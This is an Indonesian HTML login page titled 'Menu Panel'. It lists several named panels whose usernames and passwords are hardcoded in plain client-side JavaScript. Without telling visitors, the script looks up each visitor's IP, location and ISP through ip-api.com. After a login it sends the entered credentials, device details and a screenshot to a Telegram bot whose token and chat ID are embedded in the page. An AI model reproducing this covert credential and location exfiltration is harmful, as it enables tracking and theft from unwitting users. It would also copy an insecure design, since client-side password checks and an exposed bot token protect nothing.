<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Menu Panel</title>
  <style>
    :root {
      --primary: #2196f3;
      --primary-dark: #0d47a1;
      --success: #4caf50;
      --danger: #f44336;
      --text: #e0e0e0;
      --bg: #121212;
      --card: #1e1e1e;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: var(--bg);
      margin: 0;
      padding-top: 50px;
      text-align: center;
      color: var(--text);
    }

    h1 {
      font-size: 2.5rem;
      color: var(--primary);
      margin-bottom: 30px;
      position: relative;
    }

    /* Glitch Effect */
    h1::before, h1::after {
      content: attr(data-text);
      position: absolute;
      left: 0;
      width: 100%;
      overflow: hidden;
    }

    h1::before {
      top: -2px;
      color: #f0f;
      z-index: -1;
      animation: glitch 1s infinite linear alternate-reverse;
    }

    h1::after {
      top: 2px;
      color: #0ff;
      z-index: -1;
      animation: glitch 0.8s infinite linear alternate-reverse;
    }

    @keyframes glitch {
      0% { clip: rect(0, 9999px, 0, 0); }
      5% { clip: rect(0, 9999px, 100%, 0); }
      10% { clip: rect(50%, 9999px, 100%, 0); }
      15% { clip: rect(0, 9999px, 100%, 0); }
      20% { clip: rect(80%, 9999px, 100%, 0); }
      100% { clip: rect(0, 9999px, 0, 0); }
    }

    .panel-button {
      margin: 10px;
      padding: 15px 25px;
      font-size: 16px;
      background-color: var(--primary);
      border: none;
      color: white;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
    }

    .panel-button:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
    }

    .login-form {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: var(--card);
      padding: 25px 20px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      z-index: 1001;
      width: 300px;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.6);
      z-index: 1000;
    }

    input[type="text"], input[type="password"] {
      width: 90%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #555;
      background: #2c2c2c;
      color: white;
      border-radius: 8px;
      font-size: 14px;
    }

    .login-form button {
      margin: 6px 4px;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    .login-form button:first-child {
      background-color: var(--success);
      color: white;
    }

    .login-form button:last-child {
      background-color: var(--danger);
      color: white;
    }

    #notif {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #333;
      color: #fff;
      padding: 12px 20px;
      border-radius: 10px;
      display: none;
      z-index: 1002;
      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
    }
  </style>
</head>
<body>

<h1 data-text="Menu Panel">Menu Panel</h1>
<div id="menuContainer"></div>

<div class="overlay" id="overlay"></div>
<div class="login-form" id="loginForm">
  <h3 id="panelTitle">Login</h3>
  <input type="text" id="username" placeholder="Username"/><br>
  <input type="password" id="password" placeholder="Password"/><br><br>
  <button onclick="submitLogin()">Masuk</button>
  <button onclick="closeForm()">Batal</button>
</div>

<div id="notif"></div>
<div id="captureArea" style="display:none;">
  <div id="reportText"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
  const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE"; // Ganti token
  const chatId = "7274253936"; // Ganti ID

  const panels = [
    { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
    { name: "PT JASTEB 1", user: "admin", pass: "111", url: "https://example.com/jasteb" },
    { name: "ZaanHost", user: "zan", pass: "zan", url: "https://example.com/zaanhost" },
    { name: "PRIBADI FAAN", user: "faantek", pass: "faantek", url: "https://example.com/faantek" },
    { name: "KOSONG", user: "test", pass: "123", url: "https://example.com/kosong" }
  ];

  let selectedPanel = null;
  let geoInfo = "Memuat lokasi...";

  fetch("https://ip-api.com/json")
    .then(res => res.json())
    .then(data => {
      geoInfo = `${data.city}, ${data.regionName}, ${data.country} - ${data.isp} (${data.query})`;
    })
    .catch(() => {
      geoInfo = "Lokasi tidak tersedia";
    });

  function renderButtons() {
    const container = document.getElementById("menuContainer");
    panels.forEach(panel => {
      const btn = document.createElement("button");
      btn.className = "panel-button";
      btn.textContent = panel.name;
      btn.onclick = () => {
        selectedPanel = panel;
        document.getElementById("panelTitle").textContent = "Login - " + panel.name;
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
        document.getElementById("overlay").style.display = "block";
        document.getElementById("loginForm").style.display = "block";
      };
      container.appendChild(btn);
    });
  }

  function closeForm() {
    document.getElementById("overlay").style.display = "none";
    document.getElementById("loginForm").style.display = "none";
  }

  function submitLogin() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    if (!selectedPanel) return;

    if (username === selectedPanel.user && password === selectedPanel.pass) {
      showNotif("Login berhasil", "#4caf50");

      const deviceInfo = navigator.userAgent;
      const message = `
<b>LOGIN PANEL</b>
<b>Panel:</b> ${selectedPanel.name}
<b>Username:</b> ${username}
<b>Password:</b> ${password}
<b>Waktu:</b> ${new Date().toLocaleString()}
<b>Perangkat:</b> ${deviceInfo}
<b>IP & Lokasi:</b> ${geoInfo}
      `;
      sendTelegramMessage(message);

      html2canvas(document.getElementById("captureArea")).then(canvas => {
        sendImageToTelegram(canvas);
        setTimeout(() => window.location.href = selectedPanel.url, 1200);
      });
    } else {
      showNotif("Username atau password salah!", "#f44336");
    }
  }

  function showNotif(message, color = "#333") {
    const notif = document.getElementById("notif");
    notif.style.background = color;
    notif.textContent = message;
    notif.style.display = "block";
    setTimeout(() => notif.style.display = "none", 3000);
  }

  function sendTelegramMessage(text) {
    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML"
      })
    }).catch(err => console.error("Gagal kirim pesan:", err));
  }

  function sendImageToTelegram(canvas) {
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "login.png");
      fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch(err => console.error("Gagal kirim gambar:", err));
    });
  }

  renderButtons();
</script>

</body>
</html>
